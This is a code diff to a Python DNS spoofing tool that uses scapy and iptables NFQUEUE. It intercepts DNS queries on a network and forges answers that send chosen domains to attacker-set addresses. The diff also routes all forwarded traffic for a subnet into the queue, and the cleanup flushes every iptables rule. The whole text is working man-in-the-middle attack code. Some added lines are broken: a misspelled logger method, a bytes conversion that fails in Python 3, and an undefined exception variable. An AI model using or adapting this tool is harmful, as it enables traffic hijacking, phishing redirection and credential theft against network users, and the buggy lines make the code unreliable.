@@ -10,7 +10,7 @@ from ipaddress import ip_address
 
 logger = logging.getLogger("DNSSPOOFER")
 logger.setLevel(logging.DEBUG)
-fh = logging.FileHandler('dnsdeceiver.log')
+fh = logging.FileHandler('dnsspoofer.log')
 formatter = logging.Formatter("%(name)s; %(asctime)s; %(levelname)s; %(message)s", "%Y-%m-%d %H:%M:%S")
 fh.setFormatter(formatter)
 logger.addHandler(fh)
@@ -18,8 +18,8 @@ logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
 # _iptablesr_ = "iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1"
 # _iptablesr_ =  "iptables -I FORWARD -j NFQUEUE --queue-num 1"
-#_iptablesr_ = "iptables -I FORWARD -j NFQUEUE --queue-num 1"
-_iptablesr_ = "iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1"
+_iptablesr_ = "iptables -I FORWARD -d 192.168.88.0/24 -j NFQUEUE --queue-num 1"
+# _iptablesr_ = "iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1"
 _iptablesrm_ = "iptables -F && iptables -X && iptables -t nat -F && iptables -t nat -X"
 
 
@@ -47,14 +47,12 @@ class DNSSpoofer(threading.Thread):
         logger.debug('Targets set up! {}'.format(self.spoofaddr))
 
     def callback(self, packet):
-        logger.critical("HIT!")
-        print('HIT')
         if self.event.is_set():
             return
 
         payload = packet.get_payload()
         pkt = IP(payload)
-        logger.debug(pkt.show(dump=True))
+        logger.debug(pkt.summary())
         flag = False
 
         if not pkt.haslayer(DNSQR):
@@ -62,7 +60,7 @@ class DNSSpoofer(threading.Thread):
             # TODO - edit packet if needed
         else:
             res = str(pkt[DNS].qd.qname, 'utf-8')
-            logger.warning('HIT DNS RESPONSE! {}'.format(res))
+            logger.inf('HIT DNS RESPONSE! {} to {}'.format(res, pkt[IP].src))
             for i in self.spoofaddr.keys():
                 if i in res:
                     key = i
@@ -74,10 +72,11 @@ class DNSSpoofer(threading.Thread):
                       DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                       an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.spoofaddr[key]))
 
-                    print("Spoofing DNS response to: ")
+                    packet.set_payload(str(spoofedPayload).encode())
+                    logger.debug("Spoofing DNS response to: {}".format(spoofedPayload[IP].src))
                     logger.debug(spoofedPayload.show(dump=True))
-                    packet.drop()
                     send(spoofedPayload, verbose=False)
+                    packet.accept()
                     flag = True
                 else:
                     logger.debug('Asked for nonspoofed domain! {}'.format(res))
@@ -130,8 +129,7 @@ class DNSSpoofer(threading.Thread):
     def __run_threaded(q):
         try:
             print('Starting DNS deceiver!')
-            q.run()  # Main loop
-            print('Finishing!')
+            q.run(True)  # Main loop
         except:
             msg = "Hard error occured! {}".format(e)
             logger.critical(msg)
@@ -147,13 +145,6 @@ class DNSSpoofer(threading.Thread):
         t.start()
         while not self.event.is_set():
             self.configurator()
-            #try:
-            #    q.run(False)  # Main loop
-            #except:
-            #    msg = "Hard error occured! {}".format(e)
-            #    logger.critical(msg)
-            #    print(msg)
-            #finally:
 
         print("DNSspoofer finishing!")
         q.unbind()
